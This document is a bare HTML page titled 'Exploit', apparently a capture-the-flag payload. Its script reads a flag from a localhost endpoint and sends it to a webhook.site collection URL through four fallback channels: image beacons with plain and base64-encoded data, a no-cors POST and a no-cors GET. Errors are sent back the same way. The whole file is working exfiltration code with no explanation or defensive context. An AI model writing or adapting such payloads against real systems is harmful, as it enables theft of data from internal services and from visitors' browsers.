<!DOCTYPE html>
<html>
<head><title>Exploit</title></head>
<body>
<script>
// Try multiple exfiltration methods
fetch('http://127.0.0.1/flag')
  .then(r => r.text())
  .then(flag => {
    // Method 1: Image - usually works even with CORS
    const img1 = new Image();
    img1.src = 'https://webhook.site/5dc1560a-274c-4539-af81-568512041310?flag=' + encodeURIComponent(flag);

    // Method 2: Image with base64
    const img2 = new Image();
    img2.src = 'https://webhook.site/5dc1560a-274c-4539-af81-568512041310?b64=' + btoa(flag);

    // Method 3: Try fetch with no-cors
    fetch('https://webhook.site/5dc1560a-274c-4539-af81-568512041310', {
      method: 'POST',
      mode: 'no-cors',
      body: flag
    });

    // Method 4: Fetch as GET parameter
    fetch('https://webhook.site/5dc1560a-274c-4539-af81-568512041310?data=' + btoa(flag), {
      mode: 'no-cors'
    });
  })
  .catch(e => {
    // Send error via image
    const errImg = new Image();
    errImg.src = 'https://webhook.site/5dc1560a-274c-4539-af81-568512041310?error=' + encodeURIComponent(e.message);
  });
</script>
</body>
</html>
